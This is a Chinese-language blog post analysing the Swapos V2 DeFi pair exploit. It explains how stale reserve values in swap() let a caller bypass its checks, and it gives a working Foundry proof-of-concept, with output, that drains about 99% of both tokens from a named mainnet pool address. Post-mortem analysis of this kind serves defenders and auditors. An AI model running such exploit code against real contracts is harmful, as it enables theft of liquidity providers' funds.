---
title: "Swapos v2 attack 攻击分析"
date: 2023-04-19T10:12:15+08:00
draft: false
author: yinhui
categories: [security]
tags: [defi] 
---

saving gas的锅

<!--more-->

https://twitter.com/CertiKAlert/status/1647530789947469825

以攻击者的这个tx为例: https://etherscan.io/tx/0xbe643ccdcae57181b9fef554d63029e0605b2e860172d442c37eaabffdb44575

## 漏洞分析

存在漏洞的合约地址为 [0x8ce2F9286F50FbE2464BFd881FAb8eFFc8Dc584f](https://etherscan.io/address/0x8ce2f9286f50fbe2464bfd881fab8effc8dc584f#code)

在其合约代码[SwaposV2Pair.sol](https://vscode.blockscan.com/ethereum/0xf40593A22398c277237266A81212f7D41023b630) 中 提供了一个外部函数`swap()` , 代码如下:

```solidity
    function swap(
        uint amount0Out,
        uint amount1Out,
        address to,
        bytes calldata data
    ) external lock {
        require(
            amount0Out > 0 || amount1Out > 0,
            "SwaposV2: INSUFFICIENT_OUTPUT_AMOUNT"
        );
        (uint112 _reserve0, uint112 _reserve1, ) = getReserves(); // gas savings 
        require(
            amount0Out < _reserve0 && amount1Out < _reserve1,
            "SwaposV2: INSUFFICIENT_LIQUIDITY"
        );

        uint balance0;
        uint balance1;
        {
            // scope for _token{0,1}, avoids stack too deep errors
            address _token0 = token0;
            address _token1 = token1;

            require(to != _token0 && to != _token1, "SwaposV2: INVALID_TO");
            
            if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens
            if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens
            
            if (data.length > 0)
                ISwaposV2Callee(to).swaposV2Call(
                    msg.sender,
                    amount0Out,
                    amount1Out,
                    data
                );
            
            balance0 = IERC20(_token0).balanceOf(address(this));
            balance1 = IERC20(_token1).balanceOf(address(this));
        }
       
        uint amount0In = balance0 > _reserve0 - amount0Out
            ? balance0 - (_reserve0 - amount0Out)
            : 0;
        uint amount1In = balance1 > _reserve1 - amount1Out
            ? balance1 - (_reserve1 - amount1Out)
            : 0;
        require(
            amount0In > 0 || amount1In > 0,
            "SwaposV2: INSUFFICIENT_INPUT_AMOUNT"
        );

        {
            uint balance0Adjusted = balance0.mul(10000).sub(amount0In.mul(10));
            uint balance1Adjusted = balance1.mul(10000).sub(amount1In.mul(10));
            require(
                balance0Adjusted.mul(balance1Adjusted) >=
                    uint(_reserve0).mul(_reserve1).mul(1000 ** 2),
                "SwaposV2: K"
            );
        }

        _update(balance0, balance1, _reserve0, _reserve1);
        emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);
    }

```

注意到其中的这两行代码:

```solidity
            if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens
            if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens
```

其中`_safeTransfer`代码如下:

```solidity
    function _safeTransfer(address token, address to, uint value) private {
        (bool success, bytes memory data) = token.call(
            abi.encodeWithSelector(SELECTOR, to, value)
        );
        require(
            success && (data.length == 0 || abi.decode(data, (bool))),
            "SwaposV2: TRANSFER_FAILED"
        );
    }
```

也就是说 `swap()`函数允许外部调用者将池子的中的token0或token1 发送给任意接收方 😱

当然, 代码中有一堆`require`语句用于条件检查, 只要能绕过这些检查, 就能任意转账

假设攻击者要将池中的大部分token0 划转给自己:

```solidity
SwaposV2.swap(<90% of token0 in the pool>, 0, <address of attacker>, "")
```

那么攻击者看看能不能绕过这些`require`

### require 1

```solidity
        require(
            amount0Out > 0 || amount1Out > 0,
            "SwaposV2: INSUFFICIENT_OUTPUT_AMOUNT"
        );
```

检查`amount0Out`和`amount1Out` 至少一个大于0, 攻击者传入的`amount0Out`参数为"90% of token0 in the pool", 没毛病



### require 2

```solidity

        (uint112 _reserve0, uint112 _reserve1, ) = getReserves(); 
        require(
            amount0Out < _reserve0 && amount1Out < _reserve1,
            "SwaposV2: INSUFFICIENT_LIQUIDITY"
        );
```

获取库存, 检查输出小于库存, 攻击者只要90% 🤪

### require 3

```solidity
require(to != _token0 && to != _token1, "SwaposV2: INVALID_TO");
```

确保接收方不是token0或token1, 没问题, 是我



### require 4

```solidity
        
        balance0 = IERC20(_token0).balanceOf(address(this));
        balance1 = IERC20(_token1).balanceOf(address(this));
        uint amount0In = balance0 > _reserve0 - amount0Out
            ? balance0 - (_reserve0 - amount0Out)
            : 0;
        uint amount1In = balance1 > _reserve1 - amount1Out
            ? balance1 - (_reserve1 - amount1Out)
            : 0;
        require(
            amount0In > 0 || amount1In > 0,
            "SwaposV2: INSUFFICIENT_INPUT_AMOUNT"
        );
```

重点逻辑分析:        

如果当前余额 大于 先前的库存减去输出的数量， 则输入的数量为余额减去先前的库存减去输出的数量， 否则为0.比如先前的库存_reserve0:100， 输出:amount0Out10， 100-10=90， 如果当前余额balance0大于90，则输入的数量为当前余额banlance0-(100-10)

 这里的逻辑很关键：因为按照正常思路， 当前余额balance0 应该等于先前余额_reserve0减去输出的数量amount0Out

为了绕过这个require：可以先向这个合约存点token，如果你要划转token0，则先存点token0，保证balance0 > _reserve0 - amount0Out

**?? 为什么可以绕过， 按照正常思路：当前余额应该始终等于先前库存减去输出额啊？**

**这是因为当前余额balance0是最新的值：IERC20(_token0).balanceOf(address(this));_**

**而先前的库存_reserve0根本就不是最新的值：其是通过getReserves()函数得到的， 其值是在_update()被更新的，而更新发生在过去的mint(), burn(), sync(), swap()等**

```solidity
(uint112 _reserve0, uint112 _reserve1, ) = getReserves(); // gas savings

//...
    function getReserves()
        public
        view
        returns (
            uint112 _reserve0,
            uint112 _reserve1,
            uint32 _blockTimestampLast
        )
    {
        _reserve0 = reserve0;
        _reserve1 = reserve1;
        _blockTimestampLast = blockTimestampLast;
    }
    
    
//...
    function _update(
        uint balance0,
        uint balance1,
        uint112 _reserve0,
        uint112 _reserve1
    ) private{
    //..
        reserve0 = uint112(balance0);
        reserve1 = uint112(balance1);
        blockTimestampLast = blockTimestamp;
        emit Sync(reserve0, reserve1);
    }
```



比如库存（旧值）100， ，存入1， 划走90， 那么balance0 为 101-90 = 11 ， 而_reserve0 - amount0Out = 100 - 90 =10， 满足 11 > 10, so, amount0In=10



> 根据代码作者的注释, 使用 `getReserves()`函数是为了节省gas. 这骚操作节省得有点贵啊
>
> gas费: https://github.com/wolflo/evm-opcodes/blob/main/gas.md#a5-balance-extcodesize-extcodehash

### require 5

```solidity
uint balance0Adjusted = balance0.mul(10000).sub(amount0In.mul(10));
uint balance1Adjusted = balance1.mul(10000).sub(amount1In.mul(10));
require(balance0Adjusted.mul(balance1Adjusted) >=uint(_reserve0).mul(_reserve1).mul(1000 ** 2),"SwaposV2: K"
);
```

以上面的token0库存（旧值）100， ，存入1， 划走90为例

balance0Adjusted = 1110000 - 1010 = 109000

 假设token1库存100, balance1 = 100

 balance1Adjusted = 100*10000 - 0*10 = 1000000

满足 1090001000000 >= 10010010001000 开绿灯



全部`require`都满足, 那么攻击者的 `SwaposV2.swap(<90% of token0 in the pool>, 0, <address of attacker>, "")` 就不会被revert



## POC

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

// https://twitter.com/CertiKAlert/status/1647530789947469825
interface IWETH {
    function deposit() external payable;

    function transfer(address to, uint256 value) external returns (bool);

    function approve(address guy, uint256 wad) external returns (bool);

    function withdraw(uint256 wad) external;

    function balanceOf(address) external view returns (uint256);
}

interface ISWP {
    function swap(
        uint amount0Out,
        uint amount1Out,
        address to,
        bytes calldata data
    ) external;

    function getReserves()
        external
        view
        returns (
            uint112 _reserve0,
            uint112 _reserve1,
            uint32 _blockTimestampLast
        );

    function balanceOf(address) external view returns (uint256);

    function transfer(address to, uint256 value) external returns (bool);
}

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);

    function transfer(address to, uint256 value) external returns (bool);
}

IWETH constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
IERC20 constant SWP_Token = IERC20(0x09176F68003c06F190ECdF40890E3324a9589557);
// SWP <=> WETH
ISWP constant SWPV2_Pool = ISWP(0x8ce2F9286F50FbE2464BFd881FAb8eFFc8Dc584f);

contract Hack is Test {
    function setUp() public {
        vm.createSelectFork("theNet", 17057400);
        deal(address(WETH), address(this), 100);
        vm.label(address(WETH), "WETH");
        vm.label(address(SWPV2_Pool), "SWPV2Pool");
        vm.label(address(SWP_Token), "SWPTOKEN");
    }

    function testPoc() public {
        // 绕过 "SwaposV2: INSUFFICIENT_INPUT_AMOUNT"
        WETH.transfer(address(SWPV2_Pool), 10);

        (uint112 token0, uint112 token1, ) = SWPV2_Pool.getReserves();
        emit log_named_decimal_uint(
            "[before] token0(SWP_Token) form getReserves in pool",
            token0,
            18
        );
        emit log_named_decimal_uint(
            "[before] token1(WETH) getReserves in pool",
            token1,
            18
        );

        //划走99% 的 token0 或 token1都可以，二选一
        SWPV2_Pool.swap((token0 * 99000) / 100000, 0, address(this), "");

        (token0, token1, ) = SWPV2_Pool.getReserves();
        emit log_named_decimal_uint(
            "[after] token0(SWP_Token) form getReserves in pool",
            token0,
            18
        );
        emit log_named_decimal_uint(
            "[after] token1(WETH) getReserves in pool",
            token1,
            18
        );

        //故技重施，划走另外一个币
        SWP_Token.transfer(address(SWPV2_Pool), 10);
        SWPV2_Pool.swap(0, (token1 * 99000) / 100000, address(this), "");

        (token0, token1, ) = SWPV2_Pool.getReserves();
        emit log_named_decimal_uint(
            "[after] token0(SWP_Token) form getReserves in pool",
            token0,
            18
        );
        emit log_named_decimal_uint(
            "[after] token1(WETH) getReserves in pool",
            token1,
            18
        );

        emit log_named_decimal_uint(
            "Now, i have SWP: ",
            SWP_Token.balanceOf(address(this)),
            18
        );
        emit log_named_decimal_uint(
            "Now, i have WETH: ",
            WETH.balanceOf(address(this)),
            18
        );
    }
}


```

输出:

```
Running 1 test for test/hack.t.sol:Hack
[PASS] testPoc() (gas: 131472)
Logs:
  [before] token0(SWP_Token) form getReserves in pool: 147580.970131255838890994
  [before] token1(WETH) getReserves in pool: 131.642780241915502488
  [after] token0(SWP_Token) form getReserves in pool: 1475.809701312558388910
  [after] token1(WETH) getReserves in pool: 131.642780241915502498
  [after] token0(SWP_Token) form getReserves in pool: 1475.809701312558388920
  [after] token1(WETH) getReserves in pool: 1.316427802419155025
  Now, i have SWP: : 146105.160429943280502074
  Now, i have WETH: : 130.326352439496347563
```

